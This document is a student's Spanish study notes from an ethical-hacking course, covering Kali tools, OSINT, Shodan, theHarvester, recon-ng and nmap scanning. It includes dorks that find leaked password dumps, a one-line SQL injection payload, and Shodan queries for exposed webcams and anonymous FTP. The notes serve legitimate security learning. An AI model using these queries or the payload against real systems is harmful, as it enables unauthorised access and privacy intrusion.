# Estudia 
 - Kali Linux / Hack the box
 - Vulnerabilidades / CVE
 - EDR / XDR
 - Firewall / WAF
 - SIEM / SOAR
# Kali linux
 - Kali Linux es una distribución de Linux basada en Debian diseñada específicamente para pruebas de penetración, análisis forense digital, y seguridad informática. Es mantenida y desarrollada por Offensive Security, y es ampliamente utilizada por profesionales de ciberseguridad, investigadores, y entusiastas para evaluar la seguridad de sistemas y redes.
# PHRACK 
 - Es una revista con muchos articulos subidos a lo largo del tiempo respecto a la ciberseguridad
## Características de Kali Linux:
 - Amplia Colección de Herramientas de Seguridad: Kali Linux viene preinstalado con cientos de herramientas para realizar pruebas de penetración, auditorías de seguridad, análisis forense, ingeniería inversa, y más. Algunas de las herramientas más conocidas incluidas son:
### Nmap: 
 - Escáner de red.
### Metasploit Framework: 
 - Plataforma de desarrollo de exploits.
### Wireshark: 
 - Analizador de tráfico de red.
### John the Ripper: 
 - Herramienta de cracking de contraseñas.
### Aircrack-ng: 
 - Suite de herramientas para evaluar la seguridad de redes inalámbricas.
### Actualizaciones y Repositorios de Seguridad: 
 - Kali Linux es conocido por sus actualizaciones frecuentes y su acceso a repositorios de software específicamente ajustados para ciberseguridad. Las actualizaciones aseguran que las herramientas sean las versiones más recientes y estables.

### Modos de Instalación Flexibles:
 - Kali Linux puede ejecutarse de varias maneras:

### Modo en Vivo (Live): 
 - Arranque desde un USB o DVD sin necesidad de instalarlo en el disco duro.
### Instalación Completa: 
 - Instalación estándar en el disco duro.
### Máquinas Virtuales: 
 - Disponible como imagen para herramientas de virtualización como VMware y VirtualBox.
### Subsistema de Windows para Linux (WSL): 
 - Ejecutar Kali dentro de Windows.
### Soporte para Plataformas Múltiples: 
 - Además de las arquitecturas x86 y x64, Kali Linux también es compatible con ARM (como Raspberry Pi), lo que permite realizar pruebas de seguridad en dispositivos más pequeños o integrados.

### Alta Personalización y Facilidad de Uso: 
 - Kali Linux es altamente personalizable y ofrece diferentes entornos de escritorio, como GNOME, KDE, Xfce, y otros. También se pueden crear imágenes personalizadas con las herramientas específicas necesarias para ciertas pruebas.

### Entornos Seguros de Desarrollo y Pruebas: 
 - Kali Linux incluye características como la posibilidad de ejecutar en modo "rootless" (sin superusuario) para aumentar la seguridad, lo que permite a los usuarios realizar pruebas de penetración en entornos más controlados.

### Documentación y Comunidad Activa:
 - Kali Linux está bien documentado y cuenta con una comunidad activa de usuarios y desarrolladores. Hay manuales, tutoriales, y cursos (como los de Offensive Security) que ayudan a los usuarios a aprender a usar las herramientas y técnicas de hacking ético.

### Aplicaciones de Kali Linux:
 - Pruebas de Penetración: Usado por pentesters para identificar y explotar vulnerabilidades en sistemas y aplicaciones.
Análisis Forense Digital: Herramientas incluidas en Kali permiten analizar discos duros, recuperar datos eliminados, y realizar investigaciones de seguridad.
Investigación en Ciberseguridad: Utilizado por investigadores de seguridad para estudiar amenazas, malware y técnicas de hacking.
Aprendizaje y Educación: Amplia base de uso en cursos de seguridad informática y hacking ético.
# Comandos de linux 
 - La tecla *TAB* nos permite ver los comandos que podemos usar
 - cd -> Es para pocisionarnos en una carpeta o salir de cualquiera de ellas
 - ls -> Es para mostrar los archivos o carpetas que hay dentro de un directorio/carpeta
 - rm -> Es para eliminar carpetas/archivos
 - bash -> Nos permite iniciar instancias o ejecutar scripts
 - clear -> Limpia la consola
 - mkdir -> Crea un nuevo directorio
 - wget -> nos permite descargar archivos
 - unzip -> nos permite descomprimir archivos .zip
 - -h -> nos muestra todos los comandos
 - CTRL + C -> Nos permite cancelar operaciones en la terminal
 - chmod -> se utiliza para cambiar los permisos de archivos y directorios
 - cat -> Nos permite visualisar un archivo de texto

## Sudo
 - Permite utilizar comandos en modo superusuario
 - Apt -> Simplifica tareas comunes como la instalación, actualización y eliminación de paquetes de software
 - update -> Permite actualizar la lista de paquetes
 - remove -> Permite desinstalar una app
 - dhclient -> Nos permite solicitar otras direcciones ip y realizar algunas configuraciones de red
## iptables 
 - se utiliza para configurar y gestionar las reglas del cortafuegos
 - -F -> SE usa para eliminar todas las configuraciones y restablecer iptables a sus vvalores predeterminados
 - -S -> Nos permite lsitar todas las reglas actuales de iptables
## Pip 
 - nos permite instalar o desinstalar paquetes de python
 - -r -> nos permite intstalar requerimientos/dependencias
## Python
 - nos permite ejecutar el interprete de python
 - -h -> nos muestra todos los comandos
# Clase de teoria hacking etico dia 2 30/08/2024
## Teoria
 - En el curso vimos las diferentes metodologias que se van a tratar, 
tambien ciertos aspectos a tratar referentes a contratos, el como vamos a proceder al recibir la aprobacion por el cliente,
el como realizar un informe de hacking etico.
### Metodologias
- OSSTMM
- The penetration testing execution standard
- ISSAF
- OTP
### Metodologia usada en el curso
- Definicion del alcance del test de penetracion
- Recopilacion de informacion
- Identificacion y analisis de vulnerabilidades
- Explotacion de las vulnerabilidades
- Post- Explotacion
- elaboracion del reporte
### definicion del alcance del hacking etico
- Antes de realizar ninguna accion, discutir con el cliente las tareas que se llevaran acabo
- Asegurar mediante contrato firmado
- Analisis de las politicas de la organizacion que define el uso que los usuarios hacen de los sistemas
- procedimiento en el caso que se genere una intrusion por parte de un tercero
### Ejemplos de informes y auditorias de seguridad
 - https://pentestreports.com/templates
 - https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report

# Clase teorico/practica dia 1 30/08/2024
## Teoria
### Recopilacion pasiva de informacion o tambien llamada OSINT
 - recopilar la mayor cantidad de informacion de la infraestructura sin interactuar lo mas minimo con el objetivo.
 recoleccion de informacion sobre un objetivo determiado sin que las actividades realizadas por el analista sean minimamente detectadas.
### Pros y contras
 - dificil de realizar, proporciona poca informacion
 - la manera es con informacion publica
 - raramente se utiliza de manera individual
### donde aplicarla 
 - cuando no se tiene nada de informacion del objetivo
 - en empresas con una infrastructura antigua
...

## Practica - Uso de google Dorks, Comandos y operadores booleanos usados
 - Site 
 - filetype
 - ""
 - ext
### Ejemplos de Dorking
 - site:Udemy.com filetype:PDF
 - "index of"/"chat/logs"
 - filetype:txt
 - filetype:SQL"MySQL dump"(pass|password|passwd|pwd)
 - inurl:index.php?id= SQL injection -> 'or'1'=='1'--
 - site gov file type:pdf allintitle
### Links para mas dorks y ayudas
 - https://gist.github.com/zachbrowne/489762a6852abb24f9e3
 - https://www.exploit-db.com/google-hacking-database
### Comandos Principales de Dorks

 - define:término - Se muestran definiciones procedentes de páginas web para el término buscado.

 - filetype:término - Las búsquedas se restringen a páginas cuyos nombres acaben en el término especificado. Sobretodo se utiliza para determinar la extensión de los ficheros   requeridos. Nota: el comando ext:término se usa de manera equivalente.

 - site:sitio/dominio - Los resultados se restringen a los contenidos en el sitio o dominio especificado. Muy útil para realizar búsquedas en sitios que no tienen buscadores internos propios.

 - link:url - Muestra páginas que apuntan a la definida por dicha url. La cantidad (y calidad) de los enlaces a una página determina su relevancia para los buscadores. Nota: sólo presenta aquellas páginas con pagerank 5 o más.

 - cache:url - Se mostrará la versión de la página definida por url que Google tiene en su memoria, es decir, la copia que hizo el robot de Google la última vez que pasó por dicha página.

 - info:url - Google presentará información sobre la página web que corresponde con la url.

 - related:url - Google mostrará páginas similares a la que especifica la url.  Nota: Es difícil entender que tipo de relación tiene en cuenta Google para mostrar dichas páginas. Muchas veces carece de utilidad.

 - allinanchor:términos - Google restringe las búsquedas a aquellas páginas apuntadas por enlaces donde el texto contiene los términos buscados.

 - inanchor:término - Las búsquedas se restringen a aquellas apuntadas por enlaces donde el texto contiene el término especificado. A diferencia de allinanchor se puede combinar con la búsqueda habitual.

 - allintext:términos - Se restringen las búsquedas a los resultados que contienen los términos en el texto de la página.

 - intext:término - Restringe los resultados a aquellos textos que contienen término en el texto. A diferencia de allintext se puede combinar con la búsqueda habitual de términos.

 - allinurl:términos - Sólo se presentan los resultados que contienen los términos buscados en la url.

 - inurl:término - Los resultados se restringen a aquellos que contienen término en la url. A diferencia de allinurl se puede combinar con la búsqueda habitual de términos.

 - allintitle:términos - Restringe los resultados a aquellos que contienen los términos en el título.

 - intitle:término - Restringe los resultados a aquellos documentos que contienen término en el título. A diferencia de allintitle se puede combinar con la búsqueda habitual de términos.

### Operadores Booleanos Google Hacking

Google hace uso de los operadores booleanos para realizar búsquedas combinadas de varios términos. Esos operadores son una serie de símbolos que Google reconoce y modifican la búsqueda realizada:

 - " " - Busca las palabras exactas.

 - "- -" Excluye una palabra de la búsqueda. (Ej: gmail -hotmail, busca páginas en las que aparezca la palabra gmail y no aparezca la palabra hotmail)

 - OR (ó |) - Busca páginas que contengan un término u otro.

 - "+ -" Permite incluir palabras que Google por defecto no tiene en cuenta al ser muy comunes (en español: "de", "el", "la".....). También se usa para que Google distinga acentos, diéresis y la letra ñ, que normalmente son elementos que no distingue.

 - "* -" Comodín. Utilizado para sustituir una palabra. Suele combinarse con el operador de literalidad (" ").

# Clase practica dia 2 2/09/2024
## Shodan
 - Es otra herramienta/Buscador que nos permite la recoleccion pasiva de informacion accediendo directamente a puertos abiertos con procesos corriendo, revisando directamente sus vulnerabilidades, si podemos acceder a ellas de manera sencilla o si no, por defecto shodan intenta hacer login, nos muestra los puertos abiertos con servicios corriendo, nos ofrece un apartado para desarrolladores en la que expone una API en la que podemos realizar consultas con diferentes lenguajes de programacion.
 - Es distinta a google dorks ya que las consultas van sobre banners que nos devuelven los diferentes servicios al hacerle una peticion a un puerto, seremos capaces de encontrar cualquier tipo de sistema que tenga puertos abiertos y que tenga procesos corriendo en ellos. camaras, refrigeradores, cualquier cosa conectada a internet. con ciertos comandos podemos dirigir las consultas hacia un objetivo.
## Comandos Shodan
### Ftp 
 - cuando contiene el banner esa palabra es probable que en ese puerto este corriendo el servicio ftp *FTP = puerto 21*
#### FTP Definicion
 - El Protocolo de transferencia de archivos es un protocolo de red para la transferencia de archivos entre sistemas conectados a una red TCP, basado en la arquitectura cliente-servidor
### Anonymous
 - nos muestra si permite el login de un usuario anonimo si lo permite, si tiene restricciones, si no las tiene
### Country ""
 - este comando nos permite filtrar por pais ejemplos "CO" -> Colombia, "ES" -> España, "US"-> Estados unidos
### login ok
 - este nos permite revisar todos los puertos que reciban un login anonimo
### ORG
 - Nos permite consultar sobre una organizacion en especifico
### Camaras
 - "Server: yawcam" "Mime-Type: text/html" -> Nos permite ver webcams que tengan el software yawcam
 - ("webcam 7" OR "webcamXP") http.component:"mootools" -401 -> Nos permite ver webcams con el software webcamxp no nos permite abrirlos
 - "Server: IP Webcam Server" "200 OK" -> Nos permite ver webcams que tengan el software ip webcam
## Links para mas Comandos de Shondan
 - https://github.com/jakejarvis/awesome-shodan-queries
## Comandos Principales de Shodan
 - After: Only show results after the given date (dd/mm/yyyy) string

 - Asn: Autonomous system number string

 - Before: Only show results before the given date (dd/mm/yyyy) string

 - Category: Available categories: ics, malwarestring

 - City: Name of the city string

 - Country: 2-letter country code string

 - Geo: Accepts between 2 and 4 parameters. If 2 parameters: latitude, longitude. If 3 parameters: latitude, longitude, range. If 4 parameters: top left latitude, top left longitude, bottom right latitude, bottom right longitude.

 - Hash: Hash of the data property integer

 - Has_ipv6: True/False boolean

 - Has_screenshot: True/False boolean

 - Server: Devices or servers that contain a specific server header flag string

 - Hostname: Full host name for the device string

 - Ip: Alias for net filter string

 - Isp: ISP managing the netblock string

 - Net: Network range in CIDR notation (ex.199.4.1.0/24) string

 - Org: Organization assigned the netblock string

 - Os: Operating system string

 - Port: Port number for the service integer

 - Postal: Postal code (US-only) string

 - Product: Name of the software/product providing the banner string

 - Region: Name of the region/state string

 - State: Alias for region string

 - Version: Version for the product string

 - Vuln: CVE ID for a vulnerability string
## Bases de datos Whois
 - Son las bases de datos nombres de dominio, para dar de alta un nombre de dominio necesita dar ciertos datos, nombre, telefono, direcciones, etc...
### Como usar
 - En la terminal de kali linux, poner Whois junto a un nombre de dominio
## Archive.org
 - Nos pérmite revisar los registros historicos de las paginas, por snapshots, la pagina trata de recrear la pagina web tal y como existio en el momento en el que lo selecciones.
### Como usar
 - En el buscador bsucar archive.org - luego buscar la url que quieras ver
## Cencys
 - Escanea internet todos los dias con zmap - hace indexaciones diferentes a la sque se pueden lograr con shodan, se puede acceder a distintos resultados y por zmap a resultados mas recientes
### Como usar
 - https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=ftp
# Clase practica dia 3 3/09/2024
## The harvester - Usable
 - Nos petmite automatizar la busqueda, que realizamos anteriormente con google, con shodan y con censys al escribir el dominio del target y el realizar automaticamente las consultas
### Comandos theHarvester
 - -h, este comando nos muestra todos los comandos de theHarvester
 - -d, Aca ponemos el dominio de nuestro objetivo
 - -b, Aca colocamos los buscadores que queremos usar, separando con *,* podemos usar varios buscadores
 - -l, Aca son la cantidad de consultas que queremos que realice, *IMPORTANTE* -> Colocar un limite para que no se nos banee la ip por tanta consulta
 - -f nos permite volcar los resultados obtenidos a un fichero
#### Ejemplos
 - theHarvester -d microsoft.com -b baidu -l 100
 - theHarvester -d microsoft.com -b baidu,yahoo,duckduckgo,bing -l 100
 - theHarvester -d microsoft.com -b baidu,yahoo,duckduckgo,bing -l 100 -f resultados
### Links y ayudas
 - https://github.com/laramies/theHarvester
 - Se accede por la terminal de kali linux con el comando *theHarvester -h*.
## Miniconda 
 - Instalamos una version antigua de theHarvester, la cual instalamos en kali linx creando un entorno virtual con miniconda, configuramos el entorno para poder acceder a la version antigua de theHarvester junto con las dependencias de python 3.8.0 sin que interfieran con los demas programas que tengamos instalados.
 ### Comandos Miniconda
 - conda config --set
 - conda create -n "" python=Version
 - conda Activate
 - conda desactivate
 ### Links para la descarga
 - https://docs.anaconda.com/miniconda/
 - https://github.com/laramies/theHarvester/releases?page=2 
### Como acceder
 - Podemos acceder a este entorno virtual desde la terminal con los siguientes comandos 
 - *cd* -> A la carpeta donde creamos el entorno  
 - *conda activate Old_Harvester* -> Para activar el conda 
 - *conda desactivate* -> Para desactivar el conda
 - *cd* -> A la carpeta del theHarvester
 - python theHarvester.py -> para empezar a usarlo
### Ejemplos de comandos theHarvester antiguo vistos
 - python theHarvester.py -d microsoft.com -b google -l 100 -f Resultados2
 - python theHarvester.py -d microsoft.com -b trello -l 100 -f Resultados2
# Clase practica dia 4 04/09/2024
## Maltego - Usable
 - nos proporciona mas flexibilidad que theHarvester, para maltego todas las consultas que hagan una query a una base de datos va a generar comandos que nos van a permitir obtener esa info, podemos recrear relaciones que hay entre un objetivo y personas correos nuemros de telefono, redes sociales, y cuallquier informacion que tengamos, permitiendonos obtener datos especificos con transformadores y asi obtener toda la informacion requerida de una persona u/o empresa
# Clase practica dia 5 6/09/2024
## Recon-ng
 - esta app nos permite automatizar la busqueda de informacion por consultas a dominios, utiliza modulos muy parecido a lo anteriormente visto en maltego con los transformadores, tenemos que instalar modulos desde el lugar denominado por recon-ng como marketplace, para instalar los modulos usaremos comandos *marketplace search* -> *marketplace info* -> *marketplace install*. para usar un modulo usaremos los comandos *modules search* -> *marketplace load "El modulo"*, al ingresar el comando *options list* nos permite ver los datos que tenemos que poner a la hora de cargar uno de los modulos ejemplos, *SOURCE "Dominio"*, *CREATOR "Nombre del archivio"* , tambien tenemos modulos que nos permiten visualizar los datos de una manera muy amigable en la parte final del *marketplace search*
### Comandos 
 - help
 - modules
 - marketplace
 - search
 - info
 - install
 - options
 - run
 - show
 - keys
 - add
 - back
### recon/domains-contacts/whois_pocs
 - Este es uno de los modulos de whois, trabajados durante el curso para iniciarlo sus comandos son *options set SOURCE "Dominio"* ahora si mostramos la informacion *info* ya el modulo tiene cargado el dominio anteriormente puesto para correr este modulo se usa el comando *run*. si este modulo encuentra informacion, en concreto contactos relacionados al dominio previamente buscado se guardaran en la tabla 'contacts' para acceder a esta carpeta en este caso es con el comando *show "Nombre de la carpeta"*
### recon/companies-multi/shodan.org
 - Este es uno de los modulos de shodan, trabajados es clase para iniciarlo sus comandos son *options set SOURCE "Dominio"* ahora si mostramos la informacion *info* ya el modulo tiene cargado el dominio anteriormente puesto para correr este modulo se usa el comando *run*.
# Fin de las clases de recoleccion de informacion de manera pasiva
# Clase teorica/practica 7 09/09/2024
## Recoleccion pasivo/activa de informacion
 - Recoleccion de informacion sobhre un objetivo determinado utilizando metodos que se asimilen al trafico de red y comportamiento normal que suele recibir
### Dentro de el alcance se encuentran actividades como 
 - Consultas a servidores dns 
 - Acceso a recursos internos de las aplicaciones web
 - Analisis de metadatos de documentos
## Quedan fuera las actividades con comportamiento anomalo
## Foca analisis de metadados - Usable 
 -  foca elevenpath site: github
 - Foca es un software que nos permite escannear archivos para conocer su metadata si tiene virus, tambien nos permite utomatizar la bsuqueda de informacion pasiva mediante google dorks, permitiendonos asi buscar informacion de forma pasiva de un objetivo y usarla para conocer contraserñas, correos, numeros de telefono, etc, es una herramienta crucial ya que permite la extraccion completa de metadatos de los archivos, foca solo se puede correr en windows.
# Clase teorica /parctica dia 8 10/09/2024
## Otros usos de los metadatos
### Metagoofile
 - Otra herramienta que nos permite la extraccion de metadatos no tiene actualizaciones hace 8 años, es una aplciacion que nos sirve para los mismos usos que foca solo que un poco mas rudimentaria, y que solo nos permite consultar en google, y la corremos desde la consola de kali linux, dependemos de la herramienta exiftool para la extraccion de los metadatos con esta herramienta.
### Metashield analyzer
 - Esta es otra de las herramientas que tenemos disponibles para la extraccion de metadata de archivos, la diferencia con las otras es que esta es una app web.
### Protocolo DNS (Domain Name System)
 - Realiza una traduccion de nombres de dominio a direcciones ip
 - Corresponde con uno de los protocolos mas importantes de internet
 - Nos permite optener informacion publica sobre un dominio u organizacion
 - Descubrir relaciones entre dominios y hosts
 - tecniccas de explotacion especificas para ganar acceso
 - DNS Zone = agrupacion de registros (datos) DNS
 - Las DNS Zones contienen diferentes tipos de registros
### Registros

| Tipo  | Significado               | Valor                       |
|-------|---------------------------|-----------------------------|
| SOA   | Start of authority        | Parametros para esta        |
| A/AAA | Direccion ip de un host   | 32 Bits                     |
| MX    | Mail Exchange             | Dominio para correo         |
| NS    | Name server               | Nombre de un servidor       |
| CNAME | Canonical name            | Alias del nombre del host   |
| PTR   | Pointer                   | Alias para una direccion ip |
| SRV   | Services description      | Servicios disponibles       |
| TXT   | Text                      | Informacion de texto        |

### Como funciona el DNS
 - El usuario realizara consultas a un dominio en este caso (Example.com) Para de esta forma obtener informacion relevante, sobre dicho domonio, para poder acceder a un sitio web necesitara la ip a la cual pertenece dicho dominio, para obtener esta ip, el usuario realizara una consulta a el Local DNS Resolver, el cual revisara si la direccion ip de dicho dominio, si no es asi este le mandara una consulta a el DNS root name server, el cual hara lo mismo revisara si tiene dicha ip, si este no la tiene, devolvera a el Local DNS Resolver, una direccion para los nombres de dominios TLP.com, ahora Local DNS Resolver realizara una consulta a Top level DNS server, el cuales el que aloja los dominios .com, este devolvera el el name server que tenga dicho dominio, y por ultimo Local DNS Resolver le mandaria una consulta a Authoritative DNS server este si tendra la direccion ip a la que este asociada dicho dominio Local DNS Resolver obvtendra dicha informacion y se la dara a el usuario, asi esta pudiendo cunsultar directamente a el web server con dicha direccion ip devuelta.
# Clase practica dia 9 10/09/2024
### Central ops-Domain Dossier
 - Nos permite realizar busquedas a los Dominios mostrandonos informacion que nos puede ayudar para la recoleccion semi pasiva de informacion ya que nos permite obtener correos direcciones ip es una herramienta muy sencilla pero que nos puede ayudar a la hora de recolectar informacion sobre un objetivo
### DNSDumpsster - Usable
 - Esta herramienta esta demaciado completa ya que nos permite realizar consultas a un dominio y nos permite obtener mas informacion como geolocalizacion nos realiza un diagrama mostrandonos las relaciones que tiene ese dominio web, nos brinda informacion sobre su proveedor de internet, nos permite encontrar direcciones ip alojadas en el mismo servidor, obtener las cabeceras, saber por que name servers a pasado para poder lleegar hasta el resultado, nos permite buscar banners, y buscar los servicios. nos realiza graficos y nos permite descargar la informacion obtenida en tablas de excel
## Sniffers
 - son herramientas que se situan en nuestro sistema operativo que monitorean todo el trafico de red entrante y saliente. que estemos intercambiando con otros nodos de la red, nos permite visualisar los paquetes de red y el trafico de red de una manera bastante intuitiva
### WireShark
 - Es uno de los sniffers mas conocidos y es el mas completo respecto a todos teniendo distintas funciones y un mejor manejo, permitiendonos visualizar protocolos, el codigo detras de las paginas, paquetes, etc
 - ETH0 -> nos conecta con internet
 - Loopback -> la interfaz del localhost
# Clase practica dia 10 13/09/2024
### TCPdump
 - Es un sniffer muy completo, que se maneja totalmente por consola, 
 - -D -> nos permite ver las interfaces activas en nuestro sistema
 - -i -> Nos permite mostrar una interfaz determinada y asi empezar a capturar un trafico de red
 - -v -> Nos permite obtener mas informacion 
 - icmp -> Nos muestra unicamente informacion del trafico icmp
 - host -> Nosmuestra el trafico dirigido unicamente hacia un host concreto
 - -w -> Nos permite guardar una captura de el trafico que detecte
 - -r -> Nos permite abrir un archivo que contenga trafico
 - -n -> Nos permite observar el trafico hacia un puerto en especifico
# Clase teorico/practica dia 11 16/09/2024
## Recopilacion activa de informacion
 - Es la recoleccion sobre un objetivo determinado utilizando metodos que interactuen directamente con el, normalmente mediante el envio de trafico de red
 - En muchas ocasiones la actividad de este tipo de tecnicas suele ser detectada como actividad sospechosa o malisiosa
### Dentro del alcance se encuentran actividades como 
 - Escaneres de host 
 - Escaneres de puertos
 - Escaneres de servicio
### HackerOne
 - Es una pagina para poder probrar las herramientas de recoleccion activa de informacion y si descubres alguna prueba tambien pueders ganar dinero
### Metasploitable 3
 - https://github.com/rapid7/metasploitable3?tab=readme-ov-file
 - Es una herramienta que nos permite crear maquinas virtuales con ciertas vulnerabilidades puestas adere asi podemos crear nuestro entorno de haking etico activo sin tener que usar ninguna de las herramientas que veamos contra ninguna organizacion ni objetivo especifico ya que puede ser ilegal en algunos paises
 - una de las formas para descargar esas maquinas virtuales fue mediante github cambiando el nombre del archivo descargado desde vagrant a una extension . zip haciendo esto 2 vveces nos permitio descargarlos sistemas operativos de una manera sencilla, rapida y gratis
# Clase parctica dia 12 17/09/2024
# Clase practica dia 13 20/09/2024
# Clase practica dia 14 23/09/2024
# Clase practica dia 15 24/09/2024
# Clase practica dia 16 26/09/2024
### DNSrecon y transferencia de zona
 - Para usar la transferencia de zona vimos una pagina la cual su dominio es zonetransfer.me, lo que queremos hacer al momento de ver la transferencia de zona es la informacion que se puede filtrar en ese tipo de ficheros, todo esto claro por mala practica de las empresas al no gestionar el servidor de manera correcta.
 - Dns recon es una app que no tiene interfaz grafikca y se maneja por medio de comandos, con las consultas correctas nos permite obtener el fichero de zona unicamente si se cumple la condicion previamente dicha y es que el servidor este mal configurado, todo este proceso tambien lo podemos hacer manual icluso desde una terminal de windows con los siguientes comandos *nslook up* *set type="ns"* *"Dominio"* *server"Servidor"* *ls -d "Dominio"*.
#### Comandos 
 - dnsrecon
 - -d -> con este comando dirigimos hacia que dominio ira dirijido 
 - -t -> ponemos el tipo que deseamos que nos pase en este caso *afxr* que es el comando que solicita la transferencia de zona
### Nmap
 - https://nmap.org/man/es/index.html
## Estados de los puertos
 Estados en los que pueden encontrarse los puertos:

### open

 -An application is actively accepting TCP connections, UDP datagrams or SCTP associations on this port. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network.

### closed
 - A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. They can be helpful in showing that a host is up on an IP address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are reachable, it may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall. Then they would appear in the filtered state, discussed next.

### filtered

 - Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This slows down the scan dramatically.

### unfiltered

 - The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open.

### open|filtered

 -Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way.

### closed|filtered

 - This state is used when Nmap is unable to determine whether a port is closed or filtered. It is only used for the IP ID idle scan.
#### Tecnica de descubrimiento de host
 - nmap es una herramienta sin interfaz grafica, en esta leccion nos enseñaron a hacer un host discovery el cual nos sirve para realisar un scaneo a un host previamente identificado, asi podemos saber cuantas maquinas hay conectadas a el, cuantos estan arriba, y si hay conexion con dicho host, funciona de tal manera que manda una consulta a los puertos 443 y el puerto 80, y les pregunta si tienen a alguien con la ip objetivo, tambien podemos obtener mejores resultados y ser menos intrusivos si ejecutamos esos comandos con permisos de administrador ya que la consulta se convierte en una ARP, preguntando de nuevo quien tiene dicha ip para ver quien responde, obteniendo los mismo resultados pero de una manera menos intrusiva, tambien nos permite obtener todos los host de  una infraestructura de red sin la necesidad de proporcionarle una direccion ip, con este comando -sn " Nuestra IP" /24 nos permite ver todos los host que estan abiertos lo que hace nmap es mandar Broadcast de tipo ARP a todos los nodos que le hayamos parametrisado en este caso 250 si ve que no le responde un nodo pasa al siguiente hasta que alguno le responda para luego mandar una conexion hacia el puerto 80 si consigue mandar el broadcast a un host pero este no le responde la conexion al puerto 80 nmap lo tomara como si estuviera apagado, pero no significa que este apagado simplemente puede ser que no tenga nada corriendo en el puerto 80 para poder darle respuesta. aca podemos notar la importancia de ejecutar nmap como administrador ya que depende de realizar la conexion tcp a alguno de los puertos 80 o 443, con derechos de administrador nmap nos va a mostrar aquellos host los cuales no tenemos conexion pero nos respondieron el broadcast. es importante saber que necesitamos mas si conocer todos los host, los cuales dan una respuesta o solo aquellos que nos permiten una conexion, todo con el mismo comando pero unicamente añadiendo los permisos de administrador. Tambien podemos hacer un escaneo mucho mas intrusivo con el comando -PS ya que va a escanear todos los puertos de el host que nosotros le indiquemos haciendo mucho mas ruido y siendo mucho mas intrusivo, pero este comando tambien lo podemos limitar ya que el lo que intenta hacer es buscar una conexion con todos los puertos para luego escanearlos y ver cuales estan abiertos, si lo limitamos a que ingrese por un puerto y scanee ese mismo puerto o cualquier otro asi vamos a poder pasar mucho mas desapercibidos
#### Escaneo de puertos
 - Nmap tambien nos permite el escaneo de puertos con el uso del comando -sS nmap lo que va a hacer es preguntar si alguien tiene el host que le indicamos luego comenzara a mandar onexiones de tipo TCP a todos los puertos para asi podernos mostrar a nosotros que puertos estan abiertos y el tipo de tarea que esta ejecutando en ese puerto, Tambien nos permite escanear todos los host que le parametricemos al quitar la direccion del host y poner en su lugar 0/24 o parametrisar de donde a donde quieres realizar el escaneo de hosts parametrizando desde un numero de host a otro *Ejemplo:* 125-135 asi comenzara a esncanear todos los host que le den una respuesta y comenzara a realizar las consultas TCP para revisar todos sus puertos, o los que le hayamos parametrisado, este comando solo se puede ejecutar como administrador.
#### Descubrimiento de servicios
 - Vimos como nmap con este comando -sV nos ayuda a descubir cuales son los servicios que estan corriendo dentro de los puertos que esten abiertos, nos ayuda a descartar el script base de nmap donde supone el tipo de servicio que esta corriendo en dicho puerto, y nos revela cual es el servicio y su version.
#### Descubrimiento de sistema operativo
 - En esta seccion vimos como nmap con el comando -O es capaz de Descubrir o tener idea de que sistema operativo usa el objetivo, lo hace escaneando diferentes servicios que estan corriendo para asi tener una idea de cual es el sistema operativo
#### nmap con el protocolo SMB
 - los scripts en nmap nos ayudan a usar ciertas herramientas que nmap trae por defecto que ya tienen tareas automatizadas, estos scripts los encontramos en /usr/share/nmap/scripts, 
#### Scripts SMB
 - --script=smb-os-discovery -> este script nos permite descubrir el sistema operativo que tiene nuestro objetivo
 - --script=smb-enum-shares -> este script nos permite ver las carpetas que esta compartiendo y si tiene acceso o no a ella
#### nmap con el protocolo SNMP
 - el protocolo snmp es uno de los protocolos mas importantes en la ciberseguridad ya que comun mente se deja abierto al momento de crear servidores y por alli podemos obtener informacion valiosa, este siempre esta en el puerto 161 el cual funciona por udp 
#### Scripts SNMP
 - --script=snmp-win32-software -> Nos muestra los programas que hay instalados en el objetivo con sus versiones
 - --script=snmp-win32-users -> Nos muestra todos los usuarios que hay dentro de el objetivo
 - --script=snmp-processes -> Nos muestra todos los procesos que estan corriendo en el objetivo
 - --script=snmp-netstat -> Nos muestra todas las conexiones que estan corriendo en el objetivo
### Comandos Nmap
 - -sn -> Nos permite realizar un escaneo de los puertos 80 y 443
 - -v -> Nos permite obtener mas informacion al momento de obtener los resultados
 - -reason -> Nos muestra la razon por la cual el puerto esta cerrado o abierto
 - -oX -> Nos permite exportar los datos obtenidos a un archivo ejemplo XML
 - stylesheet -> Nos permite insertarle una hoja de estilos al archivo creado
 - -sV -> Nos permite realizar el descubrimiento de servicios que corren dentro de un puerto abierto
 - -O -> Nos permite obtener informacion del sistema operativo
 - --script -> Nos permite usar los scripts que tiene nmap
#### -sS
 - -sS "IP" -> Va a escanear todos los puertos y va a mostrar cuales estan abiertos
 - -sS "IP" -p "Puerto" -> Va a centrarse en el puerto que le indiquemos 
#### -PS 
 - -PS"Puertos por los cuales va a probar la conexion" "IP"
 - -PS "IP" -p "Puertos a los cuales va a escanear para comprobar si estan abiertos"
### Ejemplos 
 - -sn 192.168.157.0/24
 - -PS 192.168.157.128 -p 80
 - -PS21,22,23,24 192.168.157.128 -p 21
 - -PS21,22,23,24 192.168.157.0/24 -p 21
